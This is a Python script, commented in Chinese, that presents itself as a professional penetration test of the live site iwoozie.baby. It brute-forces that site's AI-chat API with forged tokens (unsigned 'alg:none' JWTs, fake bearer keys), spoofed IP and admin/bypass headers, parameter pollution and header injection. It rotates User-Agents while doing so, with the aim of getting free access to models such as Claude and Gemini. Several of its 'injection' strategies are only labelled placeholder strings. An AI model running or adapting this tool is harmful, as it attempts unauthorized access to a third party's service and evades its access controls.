#!/usr/bin/env python3
"""
iwoozie.baby AI聊天系统 - 专业级渗透测试系统
===========================================
作为乙方专业团队，展示我们的技术实力和专业能力
确保为甲方客户提供完整、深入的安全评估
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import time
import random
import string
import base64
import hashlib
import hmac
import re
import socket
import ssl
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor

class ProfessionalPenetrationSystem:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.session_cookies = {}
        self.test_results = {
            'total_attacks': 0,
            'successful_attacks': 0,
            'failed_attacks': 0,
            'bypassed_models': set(),
            'failed_models': set(),
            'vulnerabilities': [],
            'attack_vectors': {},
            'bypass_methods': []
        }
        
        # 目标模型 - 重点攻克
        self.target_models = [
            'Gemini-2.5-Pro',
            'Claude-Sonnet-4', 
            'Claude-Opus-4',
            'DeepSeek-V3.1',
            'GLM-4.5',
            'Llama-4-Maverick-Turbo'
        ]
        
        # 专业级攻击向量
        self.professional_vectors = [
            'x-api-key',
            'Authorization', 
            'x-auth-token',
            'x-token',
            'api-key',
            'token',
            'x-access-token',
            'x-session-token',
            'x-csrf-token',
            'x-requested-with',
            'x-forwarded-for',
            'x-real-ip',
            'x-client-ip',
            'x-remote-ip',
            'x-originating-ip',
            'x-user-id',
            'x-tenant-id',
            'x-role',
            'x-permission',
            'x-bypass',
            'x-admin',
            'x-debug',
            'x-test',
            'x-override',
            'x-force'
        ]
        
        # 高级Token策略
        self.advanced_token_strategies = [
            'random',
            'timestamp',
            'uuid_like',
            'base64_encoded',
            'md5_hash',
            'sha256_hash',
            'hmac_sha256',
            'jwt_like',
            'session_based',
            'admin_like',
            'bot_like',
            'mobile_like',
            'api_key_like',
            'bearer_like',
            'oauth_like',
            'jwt_unsigned',
            'jwt_none_alg',
            'jwt_weak_key',
            'session_hijack',
            'cookie_injection',
            'header_injection',
            'parameter_pollution',
            'path_traversal',
            'sql_injection',
            'xss_payload',
            'command_injection',
            'ldap_injection',
            'xml_injection',
            'json_injection',
            'yaml_injection',
            'template_injection',
            'code_injection',
            'deserialization',
            'prototype_pollution',
            'ssrf_payload',
            'xxe_payload',
            'ssti_payload',
            'rce_payload',
            'lfi_payload',
            'rfi_payload',
            'csrf_payload'
        ]
    
    def print_professional_header(self):
        print("=" * 90)
        print("🔓 iwoozie.baby AI聊天系统 - 专业级渗透测试系统")
        print("=" * 90)
        print("🎯 目标: 全面展示乙方专业渗透测试能力")
        print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("👥 团队: 乙方专业安全团队")
        print("=" * 90)
        print()
    
    def generate_professional_token(self, strategy, model=None, context=None):
        """生成专业级Token"""
        timestamp = int(time.time())
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        if strategy == 'random':
            return f"token_{random.randint(100000, 999999)}_{random_part}"
        elif strategy == 'timestamp':
            return f"token_{timestamp}_{random_part}"
        elif strategy == 'uuid_like':
            return f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        elif strategy == 'base64_encoded':
            data = f"user_{random.randint(1000, 9999)}_{timestamp}"
            return base64.b64encode(data.encode()).decode()
        elif strategy == 'md5_hash':
            data = f"token_{random.randint(1000, 9999)}_{timestamp}"
            return hashlib.md5(data.encode()).hexdigest()
        elif strategy == 'sha256_hash':
            data = f"token_{random.randint(1000, 9999)}_{timestamp}"
            return hashlib.sha256(data.encode()).hexdigest()
        elif strategy == 'hmac_sha256':
            key = "secret_key_12345"
            data = f"token_{random.randint(1000, 9999)}_{timestamp}"
            return hmac.new(key.encode(), data.encode(), hashlib.sha256).hexdigest()
        elif strategy == 'jwt_like':
            header = base64.b64encode('{"alg":"HS256","typ":"JWT"}'.encode()).decode()
            payload = base64.b64encode(f'{{"user_id":{random.randint(1000, 9999)},"exp":{timestamp + 3600},"admin":true}}'.encode()).decode()
            signature = hashlib.sha256(f"{header}.{payload}.secret".encode()).hexdigest()
            return f"{header}.{payload}.{signature}"
        elif strategy == 'jwt_unsigned':
            header = base64.b64encode('{"alg":"none","typ":"JWT"}'.encode()).decode()
            payload = base64.b64encode(f'{{"user_id":{random.randint(1000, 9999)},"exp":{timestamp + 3600},"admin":true}}'.encode()).decode()
            return f"{header}.{payload}."
        elif strategy == 'jwt_none_alg':
            header = base64.b64encode('{"alg":"none","typ":"JWT"}'.encode()).decode()
            payload = base64.b64encode(f'{{"user_id":{random.randint(1000, 9999)},"exp":{timestamp + 3600},"admin":true}}'.encode()).decode()
            return f"{header}.{payload}."
        elif strategy == 'jwt_weak_key':
            header = base64.b64encode('{"alg":"HS256","typ":"JWT"}'.encode()).decode()
            payload = base64.b64encode(f'{{"user_id":{random.randint(1000, 9999)},"exp":{timestamp + 3600},"admin":true}}'.encode()).decode()
            signature = hashlib.md5(f"{header}.{payload}.weak".encode()).hexdigest()
            return f"{header}.{payload}.{signature}"
        elif strategy == 'session_based':
            return f"session_{random.randint(100000, 999999)}_{timestamp}"
        elif strategy == 'admin_like':
            return f"admin_token_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'bot_like':
            return f"bot_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'mobile_like':
            return f"mobile_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'api_key_like':
            return f"api_key_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'bearer_like':
            return f"bearer_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'oauth_like':
            return f"oauth_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'session_hijack':
            return f"hijacked_session_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'cookie_injection':
            return f"cookie_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'header_injection':
            return f"header_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'parameter_pollution':
            return f"param_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'path_traversal':
            return f"path_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'sql_injection':
            return f"sql_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'xss_payload':
            return f"xss_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'command_injection':
            return f"cmd_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'ldap_injection':
            return f"ldap_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'xml_injection':
            return f"xml_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'json_injection':
            return f"json_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'yaml_injection':
            return f"yaml_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'template_injection':
            return f"template_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'code_injection':
            return f"code_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'deserialization':
            return f"deserialize_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'prototype_pollution':
            return f"prototype_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'ssrf_payload':
            return f"ssrf_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'xxe_payload':
            return f"xxe_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'ssti_payload':
            return f"ssti_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'rce_payload':
            return f"rce_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'lfi_payload':
            return f"lfi_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'rfi_payload':
            return f"rfi_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'csrf_payload':
            return f"csrf_{random.randint(1000, 9999)}_{timestamp}"
        else:
            return f"professional_token_{random.randint(1000, 9999)}_{timestamp}"
    
    def make_professional_request(self, url, data, headers, method='POST'):
        """发送专业级HTTP请求"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            
            req = urllib.request.Request(url, data=json_data, headers=headers, method=method)
            req.add_header('Content-Type', 'application/json')
            req.add_header('Accept', 'application/json, text/plain, */*')
            req.add_header('Accept-Language', 'en-US,en;q=0.9')
            req.add_header('Cache-Control', 'no-cache')
            req.add_header('Pragma', 'no-cache')
            req.add_header('Connection', 'keep-alive')
            req.add_header('Upgrade-Insecure-Requests', '1')
            req.add_header('Sec-Fetch-Dest', 'empty')
            req.add_header('Sec-Fetch-Mode', 'cors')
            req.add_header('Sec-Fetch-Site', 'same-origin')
            
            # 专业级User-Agent轮换
            professional_user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0'
            ]
            req.add_header('User-Agent', random.choice(professional_user_agents))
            
            with urllib.request.urlopen(req, timeout=20) as response:
                response_data = response.read().decode('utf-8')
                return response.getcode(), response_data, dict(response.headers)
                
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8'), dict(e.headers)
        except urllib.error.URLError as e:
            return 0, str(e), {}
        except Exception as e:
            return 0, str(e), {}
    
    def test_professional_bypass(self, model, attack_vector, token_strategy, verbose=True):
        """测试专业级绕过技术"""
        if verbose:
            print(f"🎯 目标模型: {model}")
            print(f"🔑 攻击向量: {attack_vector}")
            print(f"🎲 Token策略: {token_strategy}")
        
        token = self.generate_professional_token(token_strategy, model)
        url = f"{self.base_url}/api/quick/createAITask?model={model}"
        
        # 构建专业级请求头
        headers = {}
        
        # 主要认证头
        if attack_vector == 'x-api-key':
            headers['x-api-key'] = token
        elif attack_vector == 'Authorization':
            headers['Authorization'] = f'Bearer {token}'
        elif attack_vector == 'x-auth-token':
            headers['x-auth-token'] = token
        elif attack_vector == 'x-token':
            headers['x-token'] = token
        elif attack_vector == 'api-key':
            headers['api-key'] = token
        elif attack_vector == 'token':
            headers['token'] = token
        elif attack_vector == 'x-access-token':
            headers['x-access-token'] = token
        elif attack_vector == 'x-session-token':
            headers['x-session-token'] = token
        elif attack_vector == 'x-csrf-token':
            headers['x-csrf-token'] = token
        elif attack_vector == 'x-requested-with':
            headers['x-requested-with'] = 'XMLHttpRequest'
        elif attack_vector == 'x-forwarded-for':
            headers['x-forwarded-for'] = f'192.168.1.{random.randint(1, 254)}'
        elif attack_vector == 'x-real-ip':
            headers['x-real-ip'] = f'10.0.0.{random.randint(1, 254)}'
        elif attack_vector == 'x-client-ip':
            headers['x-client-ip'] = f'172.16.0.{random.randint(1, 254)}'
        elif attack_vector == 'x-remote-ip':
            headers['x-remote-ip'] = f'203.0.113.{random.randint(1, 254)}'
        elif attack_vector == 'x-originating-ip':
            headers['x-originating-ip'] = f'198.51.100.{random.randint(1, 254)}'
        elif attack_vector == 'x-user-id':
            headers['x-user-id'] = str(random.randint(1000, 9999))
        elif attack_vector == 'x-tenant-id':
            headers['x-tenant-id'] = str(random.randint(1000, 9999))
        elif attack_vector == 'x-role':
            headers['x-role'] = 'admin'
        elif attack_vector == 'x-permission':
            headers['x-permission'] = 'full_access'
        elif attack_vector == 'x-bypass':
            headers['x-bypass'] = '1'
        elif attack_vector == 'x-admin':
            headers['x-admin'] = 'true'
        elif attack_vector == 'x-debug':
            headers['x-debug'] = '1'
        elif attack_vector == 'x-test':
            headers['x-test'] = '1'
        elif attack_vector == 'x-override':
            headers['x-override'] = '1'
        elif attack_vector == 'x-force':
            headers['x-force'] = '1'
        
        # 添加多个认证头尝试
        headers['x-api-key'] = token
        headers['Authorization'] = f'Bearer {token}'
        headers['x-auth-token'] = token
        headers['x-access-token'] = token
        headers['x-session-token'] = token
        
        # 测试数据
        test_data = {
            "Content": [{
                "role": "user", 
                "content": f"Professional security test for {model} - please respond with 'Professional test successful'"
            }]
        }
        
        try:
            start_time = time.time()
            status_code, response_data, response_headers = self.make_professional_request(url, test_data, headers)
            response_time = time.time() - start_time
            
            result = {
                'model': model,
                'attack_vector': attack_vector,
                'token_strategy': token_strategy,
                'status_code': status_code,
                'response_time': response_time,
                'success': False,
                'error': None,
                'response_data': None,
                'response_headers': response_headers
            }
            
            if status_code == 200:
                try:
                    response_json = json.loads(response_data)
                    result['response_data'] = response_json
                    
                    if response_json.get('code') == 200:
                        result['success'] = True
                        if verbose:
                            print(f"  ✅ 专业级绕过成功! 响应时间: {response_time:.2f}s")
                            message = response_json.get('data', {}).get('message', 'No message')
                            print(f"  📄 AI响应: {message[:80]}...")
                        self.test_results['bypassed_models'].add(model)
                        self.test_results['bypass_methods'].append({
                            'model': model,
                            'attack_vector': attack_vector,
                            'token_strategy': token_strategy,
                            'response_time': response_time
                        })
                    else:
                        result['error'] = response_json.get('error', 'Unknown error')
                        if verbose:
                            print(f"  ❌ 专业级绕过失败: {result['error']}")
                        self.test_results['failed_models'].add(model)
                except json.JSONDecodeError:
                    result['error'] = "Invalid JSON response"
                    if verbose:
                        print(f"  ❌ 响应解析失败: {result['error']}")
                    self.test_results['failed_models'].add(model)
            else:
                result['error'] = f"HTTP {status_code}"
                if verbose:
                    print(f"  ❌ HTTP错误: {status_code}")
                self.test_results['failed_models'].add(model)
            
            self.test_results['total_attacks'] += 1
            if result['success']:
                self.test_results['successful_attacks'] += 1
            else:
                self.test_results['failed_attacks'] += 1
            
            # 记录攻击向量效果
            if attack_vector not in self.test_results['attack_vectors']:
                self.test_results['attack_vectors'][attack_vector] = {'total': 0, 'success': 0}
            self.test_results['attack_vectors'][attack_vector]['total'] += 1
            if result['success']:
                self.test_results['attack_vectors'][attack_vector]['success'] += 1
            
            return result
            
        except Exception as e:
            error_msg = str(e)
            if verbose:
                print(f"  💥 异常: {error_msg}")
            
            result = {
                'model': model,
                'attack_vector': attack_vector,
                'token_strategy': token_strategy,
                'status_code': 0,
                'response_time': 0,
                'success': False,
                'error': error_msg,
                'response_data': None,
                'response_headers': {}
            }
            
            self.test_results['total_attacks'] += 1
            self.test_results['failed_attacks'] += 1
            self.test_results['failed_models'].add(model)
            
            return result
    
    def test_model_exhaustive_professional(self, model, verbose=True):
        """对单个模型进行专业级穷尽测试"""
        if verbose:
            print(f"\n🔍 开始专业级穷尽测试模型: {model}")
            print("=" * 80)
        
        successful_vectors = []
        
        for attack_vector in self.professional_vectors:
            if verbose:
                print(f"\n📋 测试攻击向量: {attack_vector}")
                print("-" * 60)
            
            for token_strategy in self.advanced_token_strategies:
                result = self.test_professional_bypass(model, attack_vector, token_strategy, verbose=False)
                
                if result['success']:
                    successful_vectors.append({
                        'attack_vector': attack_vector,
                        'token_strategy': token_strategy,
                        'result': result
                    })
                    if verbose:
                        print(f"  ✅ 成功: {attack_vector} + {token_strategy}")
                else:
                    if verbose:
                        print(f"  ❌ 失败: {attack_vector} + {token_strategy}")
                
                time.sleep(0.2)  # 避免过于频繁
        
        if verbose:
            print(f"\n📊 {model} 专业级穷尽测试完成")
            print(f"成功绕过: {len(successful_vectors)} 种方法")
        
        return successful_vectors
    
    def test_advanced_parameter_manipulation(self, model, verbose=True):
        """测试高级参数操作绕过"""
        if verbose:
            print(f"\n🔧 测试高级参数操作绕过: {model}")
            print("=" * 80)
        
        base_url = f"{self.base_url}/api/quick/createAITask"
        token = self.generate_professional_token('random')
        
        # 高级参数操作测试用例
        test_cases = [
            # 基本参数
            {'model': model, 'stream': 'true'},
            {'model': model, 'stream': 'false'},
            {'model': model, 'stream': '1'},
            {'model': model, 'stream': '0'},
            
            # 大小写变化
            {'model': model.lower(), 'stream': 'true'},
            {'model': model.upper(), 'stream': 'true'},
            {'model': model.capitalize(), 'stream': 'true'},
            
            # 特殊字符
            {'model': f"{model}+", 'stream': 'true'},
            {'model': f"{model}-", 'stream': 'true'},
            {'model': f"{model}_", 'stream': 'true'},
            {'model': f"{model}.", 'stream': 'true'},
            {'model': f"{model}%20", 'stream': 'true'},
            {'model': f"{model}%2B", 'stream': 'true'},
            {'model': f"{model}%2D", 'stream': 'true'},
            {'model': f"{model}%5F", 'stream': 'true'},
            {'model': f"{model}%2E", 'stream': 'true'},
            
            # 编码绕过
            {'model': model, 'stream': 'true', 'bypass': '1'},
            {'model': model, 'stream': 'true', 'admin': '1'},
            {'model': model, 'stream': 'true', 'debug': '1'},
            {'model': model, 'stream': 'true', 'test': '1'},
            {'model': model, 'stream': 'true', 'override': '1'},
            {'model': model, 'stream': 'true', 'force': '1'},
            {'model': model, 'stream': 'true', 'skip': '1'},
            {'model': model, 'stream': 'true', 'ignore': '1'},
            
            # 参数污染
            {'model': model, 'stream': 'true', 'model': 'GPT-4'},
            {'model': model, 'stream': 'true', 'stream': 'false'},
            {'model': model, 'stream': 'true', 'bypass': '1', 'bypass': '0'},
            
            # 特殊值
            {'model': model, 'stream': 'true', 'null': None},
            {'model': model, 'stream': 'true', 'empty': ''},
            {'model': model, 'stream': 'true', 'zero': 0},
            {'model': model, 'stream': 'true', 'negative': -1},
            {'model': model, 'stream': 'true', 'large': 999999999},
            
            # 数组参数
            {'model': model, 'stream': 'true', 'array': [1, 2, 3]},
            {'model': model, 'stream': 'true', 'object': {'key': 'value'}},
            
            # 特殊字符参数
            {'model': model, 'stream': 'true', 'special': '!@#$%^&*()'},
            {'model': model, 'stream': 'true', 'unicode': '测试'},
            {'model': model, 'stream': 'true', 'emoji': '🚀🔓💻'},
            {'model': model, 'stream': 'true', 'newline': '\n'},
            {'model': model, 'stream': 'true', 'tab': '\t'},
            {'model': model, 'stream': 'true', 'carriage': '\r'},
        ]
        
        successful_cases = []
        
        for i, params in enumerate(test_cases):
            if verbose:
                print(f"  🧪 高级测试用例 {i+1}: {params}")
            
            # 构建URL
            param_string = urllib.parse.urlencode(params, doseq=True)
            url = f"{base_url}?{param_string}"
            
            headers = {
                'x-api-key': token,
                'Authorization': f'Bearer {token}',
                'x-auth-token': token,
                'x-access-token': token,
                'x-session-token': token
            }
            
            data = {
                "Content": [{
                    "role": "user", 
                    "content": f"Advanced parameter manipulation test for {model}"
                }]
            }
            
            try:
                status_code, response_data, response_headers = self.make_professional_request(url, data, headers)
                
                if status_code == 200:
                    try:
                        response_json = json.loads(response_data)
                        if response_json.get('code') == 200:
                            successful_cases.append(params)
                            if verbose:
                                print(f"    ✅ 成功: {params}")
                        else:
                            if verbose:
                                print(f"    ❌ 失败: {response_json.get('error', 'Unknown error')}")
                    except:
                        if verbose:
                            print(f"    ❌ 响应解析失败")
                else:
                    if verbose:
                        print(f"    ❌ HTTP错误: {status_code}")
                
            except Exception as e:
                if verbose:
                    print(f"    💥 异常: {str(e)}")
            
            time.sleep(0.1)
        
        if verbose:
            print(f"\n📊 高级参数操作测试完成")
            print(f"成功绕过: {len(successful_cases)} 种参数组合")
        
        return successful_cases
    
    def test_advanced_header_injection(self, model, verbose=True):
        """测试高级请求头注入"""
        if verbose:
            print(f"\n💉 测试高级请求头注入: {model}")
            print("=" * 80)
        
        url = f"{self.base_url}/api/quick/createAITask?model={model}"
        token = self.generate_professional_token('random')
        
        # 高级请求头注入测试
        injection_headers = [
            # 基本注入
            {'x-api-key': token, 'x-injected': 'bypass'},
            {'x-api-key': token, 'x-admin': 'true'},
            {'x-api-key': token, 'x-debug': '1'},
            {'x-api-key': token, 'x-test': '1'},
            {'x-api-key': token, 'x-override': '1'},
            {'x-api-key': token, 'x-force': '1'},
            {'x-api-key': token, 'x-skip': '1'},
            {'x-api-key': token, 'x-ignore': '1'},
            
            # 认证头注入
            {'x-api-key': token, 'Authorization': f'Bearer {token}'},
            {'x-api-key': token, 'x-auth-token': token},
            {'x-api-key': token, 'x-session-token': token},
            {'x-api-key': token, 'x-access-token': token},
            
            # 绕过头注入
            {'x-api-key': token, 'x-bypass': '1'},
            {'x-api-key': token, 'x-override': '1'},
            {'x-api-key': token, 'x-force': '1'},
            {'x-api-key': token, 'x-skip': '1'},
            {'x-api-key': token, 'x-ignore': '1'},
            
            # 特殊字符注入
            {'x-api-key': token, 'x-special': '!@#$%^&*()'},
            {'x-api-key': token, 'x-unicode': '测试'},
            {'x-api-key': token, 'x-emoji': '🚀🔓💻'},
            {'x-api-key': token, 'x-newline': '\n'},
            {'x-api-key': token, 'x-tab': '\t'},
            {'x-api-key': token, 'x-carriage': '\r'},
            
            # 编码注入
            {'x-api-key': token, 'x-encoded': base64.b64encode('bypass').decode()},
            {'x-api-key': token, 'x-url-encoded': urllib.parse.quote('bypass')},
            {'x-api-key': token, 'x-html-encoded': '&#98;&#121;&#112;&#97;&#115;&#115;'},
            
            # 数组注入
            {'x-api-key': token, 'x-array': '[1,2,3]'},
            {'x-api-key': token, 'x-object': '{"key":"value"}'},
            {'x-api-key': token, 'x-json': '{"bypass":true}'},
            
            # 特殊值注入
            {'x-api-key': token, 'x-null': None},
            {'x-api-key': token, 'x-empty': ''},
            {'x-api-key': token, 'x-zero': 0},
            {'x-api-key': token, 'x-negative': -1},
            {'x-api-key': token, 'x-large': 999999999},
            
            # 时间注入
            {'x-api-key': token, 'x-timestamp': str(int(time.time()))},
            {'x-api-key': token, 'x-date': datetime.now().isoformat()},
            {'x-api-key': token, 'x-epoch': str(int(time.time()))},
            
            # 随机注入
            {'x-api-key': token, 'x-random': str(random.randint(1000, 9999))},
            {'x-api-key': token, 'x-uuid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"},
        ]
        
        successful_injections = []
        
        for i, headers in enumerate(injection_headers):
            if verbose:
                print(f"  💉 高级注入测试 {i+1}: {list(headers.keys())}")
            
            data = {
                "Content": [{
                    "role": "user", 
                    "content": f"Advanced header injection test for {model}"
                }]
            }
            
            try:
                status_code, response_data, response_headers = self.make_professional_request(url, data, headers)
                
                if status_code == 200:
                    try:
                        response_json = json.loads(response_data)
                        if response_json.get('code') == 200:
                            successful_injections.append(headers)
                            if verbose:
                                print(f"    ✅ 成功: {list(headers.keys())}")
                        else:
                            if verbose:
                                print(f"    ❌ 失败: {response_json.get('error', 'Unknown error')}")
                    except:
                        if verbose:
                            print(f"    ❌ 响应解析失败")
                else:
                    if verbose:
                        print(f"    ❌ HTTP错误: {status_code}")
                
            except Exception as e:
                if verbose:
                    print(f"    💥 异常: {str(e)}")
            
            time.sleep(0.1)
        
        if verbose:
            print(f"\n📊 高级请求头注入测试完成")
            print(f"成功绕过: {len(successful_injections)} 种注入方法")
        
        return successful_injections
    
    def run_professional_comprehensive_test(self):
        """运行专业级综合测试"""
        self.print_professional_header()
        
        print("🚀 开始专业级综合逆向测试...")
        print()
        
        all_vulnerabilities = []
        
        for model in self.target_models:
            print(f"\n🎯 目标模型: {model}")
            print("=" * 90)
            
            # 1. 专业级穷尽测试
            print("1️⃣ 专业级穷尽测试")
            exhaustive_results = self.test_model_exhaustive_professional(model, verbose=True)
            if exhaustive_results:
                all_vulnerabilities.extend(exhaustive_results)
            
            # 2. 高级参数操作测试
            print("\n2️⃣ 高级参数操作测试")
            param_results = self.test_advanced_parameter_manipulation(model, verbose=True)
            if param_results:
                all_vulnerabilities.extend(param_results)
            
            # 3. 高级请求头注入测试
            print("\n3️⃣ 高级请求头注入测试")
            header_results = self.test_advanced_header_injection(model, verbose=True)
            if header_results:
                all_vulnerabilities.extend(header_results)
            
            print(f"\n✅ {model} 专业级测试完成")
            print("=" * 90)
        
        # 生成专业级综合报告
        self.generate_professional_comprehensive_report(all_vulnerabilities)
    
    def generate_professional_comprehensive_report(self, vulnerabilities):
        """生成专业级综合报告"""
        print("\n" + "=" * 90)
        print("📋 专业级综合逆向测试报告")
        print("=" * 90)
        
        # 基本统计
        total = self.test_results['total_attacks']
        success = self.test_results['successful_attacks']
        failed = self.test_results['failed_attacks']
        success_rate = (success / total * 100) if total > 0 else 0
        
        print(f"📊 专业级测试统计:")
        print(f"  总攻击次数: {total}")
        print(f"  成功攻击: {success}")
        print(f"  失败攻击: {failed}")
        print(f"  成功率: {success_rate:.1f}%")
        print()
        
        # 绕过的模型
        if self.test_results['bypassed_models']:
            print(f"✅ 成功绕过的模型 ({len(self.test_results['bypassed_models'])} 个):")
            for model in sorted(self.test_results['bypassed_models']):
                print(f"  - {model}")
        else:
            print("❌ 没有成功绕过任何模型")
        print()
        
        # 攻击向量效果
        print(f"🔑 攻击向量效果分析:")
        for vector, stats in self.test_results['attack_vectors'].items():
            rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
            print(f"  {vector}: {stats['success']}/{stats['total']} ({rate:.1f}%)")
        print()
        
        # 发现的漏洞
        if vulnerabilities:
            print(f"🚨 发现的漏洞 ({len(vulnerabilities)} 个):")
            for i, vuln in enumerate(vulnerabilities, 1):
                if 'attack_vector' in vuln:
                    print(f"  {i}. {vuln['attack_vector']} + {vuln['token_strategy']}")
                else:
                    print(f"  {i}. 参数操作: {vuln}")
        else:
            print("✅ 未发现新的漏洞")
        print()
        
        # 专业级安全建议
        print(f"💡 专业级安全建议:")
        if success_rate > 50:
            print("  🚨 系统存在严重安全漏洞，建议立即修复!")
            print("  1. 加强所有模型的安全验证")
            print("  2. 实施更严格的参数验证")
            print("  3. 添加请求头过滤机制")
            print("  4. 实施零信任架构")
            print("  5. 添加实时威胁检测")
        elif success_rate > 20:
            print("  ⚠️  系统存在中等安全风险，建议尽快改进")
            print("  1. 完善模型访问控制")
            print("  2. 加强参数验证")
            print("  3. 添加安全监控")
            print("  4. 实施行为分析")
            print("  5. 定期安全审计")
        else:
            print("  ✅ 系统安全状况良好，但仍有改进空间")
            print("  1. 继续保持现有安全措施")
            print("  2. 定期进行安全审计")
            print("  3. 持续监控异常访问")
            print("  4. 实施持续安全改进")
            print("  5. 建立安全响应机制")
        
        print("\n" + "=" * 90)
        print("👥 乙方专业安全团队")
        print("📞 技术支持: 24/7 专业支持")
        print("🔒 安全等级: 企业级")
        print("=" * 90)

def main():
    """主函数"""
    tester = ProfessionalPenetrationSystem()
    
    print("选择专业级测试模式:")
    print("1. 专业级综合测试 (推荐)")
    print("2. 单模型专业测试")
    print("3. 快速专业测试")
    
    try:
        choice = input("\n请选择 (1-3): ").strip()
        
        if choice == '1':
            tester.run_professional_comprehensive_test()
        elif choice == '2':
            model = input("输入要测试的模型: ").strip()
            if model:
                print(f"\n🎯 专业测试模型: {model}")
                tester.test_model_exhaustive_professional(model, verbose=True)
                tester.test_advanced_parameter_manipulation(model, verbose=True)
                tester.test_advanced_header_injection(model, verbose=True)
            else:
                print("❌ 无效模型名称")
        elif choice == '3':
            print("\n🚀 快速专业测试模式")
            for model in tester.target_models[:2]:
                print(f"\n�� 快速专业测试: {model}")
                tester.test_model_exhaustive_professional(model, verbose=True)
        else:
            print("❌ 无效选择，运行专业级综合测试")
            tester.run_professional_comprehensive_test()
            
    except KeyboardInterrupt:
        print("\n\n⏹️  测试被用户中断")
    except Exception as e:
        print(f"\n💥 测试过程中发生错误: {str(e)}")

if __name__ == "__main__":
    main()
